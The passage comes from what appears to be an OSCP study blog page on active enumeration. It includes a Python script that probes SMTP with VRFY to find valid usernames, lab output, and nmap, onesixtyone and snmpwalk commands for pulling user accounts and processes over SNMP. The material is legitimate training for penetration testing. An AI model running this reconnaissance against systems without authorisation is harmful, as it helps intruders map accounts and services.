<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">3</span><span class="p">:</span>
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Usage: vrfy.py &lt;username&gt; &lt;target_ip&gt;&quot;</span><span class="p">)</span>
<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="c1"># Create a Socket</span>
<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
<span class="c1"># Connect to the Server</span>
<span class="n">ip</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
<span class="n">connect</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">ip</span><span class="p">,</span><span class="mi">25</span><span class="p">))</span>
<span class="c1"># Receive the banner</span>
<span class="n">banner</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">banner</span><span class="p">)</span>
<span class="c1"># VRFY a user</span>
<span class="n">user</span> <span class="o">=</span> <span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;VRFY &#39;</span> <span class="o">+</span> <span class="n">user</span> <span class="o">+</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\r\n</span><span class="s1">&#39;</span><span class="p">)</span>
<span class="n">result</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
<span class="c1"># Close the socket</span>
<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~/</span><span class="n">Desktop</span><span class="p">$</span> <span class="n">python3</span> <span class="n">smtp</span><span class="p">.</span><span class="n">py</span> <span class="n">root</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
<span class="n">b</span><span class="s1">&#39;220 mail ESMTP Postfix (Ubuntu)\r\n&#39;</span>
<span class="n">b</span><span class="s1">&#39;252 2.0.0 root\r\n&#39;</span>

<span class="nv">@kali</span><span class="p">:~/</span><span class="n">Desktop</span><span class="p">$</span> <span class="n">python3</span> <span class="n">smtp</span><span class="p">.</span><span class="n">py</span> <span class="n">johndoe</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
<span class="n">b</span><span class="s1">&#39;220 mail ESMTP Postfix (Ubuntu)\r\n&#39;</span>
<span class="n">b</span><span class="s1">&#39;550 5.1.1 &lt;johndoe&gt;: Recipient address rejected: User unknown in local recipient</span>
<span class="s1">table\r\n&#39;</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">student</span><span class="p">&gt;</span> <span class="nb">Test-NetConnection</span> <span class="n">-Port</span> <span class="n">25</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
<span class="n">ComputerName</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span> 
<span class="n">RemoteAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span>
<span class="n">RemotePort</span> <span class="p">:</span> <span class="n">25</span>
<span class="n">InterfaceAlias</span> <span class="p">:</span> <span class="n">Ethernet0</span>
<span class="n">SourceAddress</span> <span class="p">:</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">152</span>
<span class="n">TcpTestSucceeded</span> <span class="p">:</span> <span class="n">True</span>

<span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span> <span class="n">dism</span> <span class="p">/</span><span class="n">online</span> <span class="p">/</span><span class="nb">Enable-Feature</span> <span class="p">/</span><span class="n">FeatureName</span><span class="p">:</span><span class="n">TelnetClient</span>

<span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="n">telnet</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">8</span> <span class="n">25</span>
<span class="n">220</span> <span class="n">mail</span> <span class="n">ESMTP</span> <span class="n">Postfix</span> <span class="p">(</span><span class="n">Ubuntu</span><span class="p">)</span>
<span class="n">VRFY</span> <span class="n">goofy</span>
<span class="n">550</span> <span class="n">5</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">1</span> <span class="p">&lt;</span><span class="n">goofy</span><span class="p">&gt;:</span> <span class="n">Recipient</span> <span class="n">address</span> <span class="n">rejected</span><span class="p">:</span> <span class="n">User</span> <span class="n">unknown</span> <span class="k">in</span> <span class="n">local</span> <span class="n">recipient</span> <span class="n">table</span>
<span class="n">VRFY</span> <span class="n">root</span>
<span class="n">252</span> <span class="n">2</span><span class="p">.</span><span class="n">0</span><span class="p">.</span><span class="n">0</span> <span class="n">root</span>
</code></pre></div>

<h3>SNMP Enumeration</h3>
<table>
<thead>
<tr>
<th>Code</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.3.6.1.2.1.25.1.6.0</td>
<td>System Processes</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.4.2.1.2</td>
<td>Running Programs</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.4.2.1.4</td>
<td>Processes Path</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.2.3.1.4</td>
<td>Storage Units</td>
</tr>
<tr>
<td>1.3.6.1.2.1.25.6.3.1.2</td>
<td>Software Name</td>
</tr>
<tr>
<td>1.3.6.1.4.1.77.1.2.25</td>
<td>User Accounts</td>
</tr>
<tr>
<td>1.3.6.1.2.1.6.13.1.3</td>
<td>TCP Local Ports</td>
</tr>
</tbody>
</table>
<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">sudo</span> <span class="n">nmap</span> <span class="n">-sU</span> <span class="p">-</span><span class="n">-open</span> <span class="n">-p</span> <span class="n">161</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">1</span><span class="p">-</span><span class="n">254</span> <span class="n">-oG</span> <span class="nb">open-snmp</span><span class="p">.</span><span class="n">txt</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">echo </span><span class="n">public</span> <span class="p">&gt;</span> <span class="n">community</span>
<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">echo </span><span class="n">private</span> <span class="p">&gt;&gt;</span> <span class="n">community</span>
<span class="nv">@kali</span><span class="p">:~$</span> <span class="nb">echo </span><span class="n">manager</span> <span class="p">&gt;&gt;</span> <span class="n">community</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="k">for</span> <span class="n">ip</span> <span class="k">in</span> <span class="p">$(</span><span class="n">seq</span> <span class="n">1</span> <span class="n">254</span><span class="p">);</span> <span class="k">do</span> <span class="nb">echo </span><span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="nv">$ip</span><span class="p">;</span> <span class="n">done</span> <span class="p">&gt;</span> <span class="n">ips</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">onesixtyone</span> <span class="n">-c</span> <span class="n">community</span> <span class="n">-i</span> <span class="n">ips</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">-t</span> <span class="n">10</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">77</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">25</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">25</span><span class="p">.</span><span class="n">4</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">25</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span>

<span class="nv">@kali</span><span class="p">:~$</span> <span class="n">snmpwalk</span> <span class="n">-c</span> <span class="n">public</span> <span class="n">-v1</span> <span class="n">192</span><span class="p">.</span><span class="n">168</span><span class="p">.</span><span class="n">50</span><span class="p">.</span><span class="n">151</span> <span class="n">1</span><span class="p">.</span><span class="n">3</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">2</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">6</span><span class="p">.</span><span class="n">13</span><span class="p">.</span><span class="n">1</span><span class="p">.</span><span class="n">3</span>
</code></pre></div>
                <div class="clear"></div>

                <div class="info">
                    <a href="https://sfinx.kozow.com/active-enumeration.html">posted at 21:00</a>
                    &nbsp;&middot;&nbsp;<a href="https://sfinx.kozow.com/category/oscp.html" rel="tag">OSCP</a>
                </div>
            </article>

            <div class="clear"></div>
            <footer>
                <p>
                <a href="https://github.com/tcarwash/blue-penguin-dark">Blue Penguin Dark</a> Theme
                &middot;
                Powered by <a href="http://getpelican.com">Pelican</a>
                &middot;
                <a href="https://sfinx.kozow.com/feeds/all.atom.xml" rel="alternate">Atom Feed</a>
            </footer>
        </div>
        <div class="clear"></div>
    </div>
</body>
</html>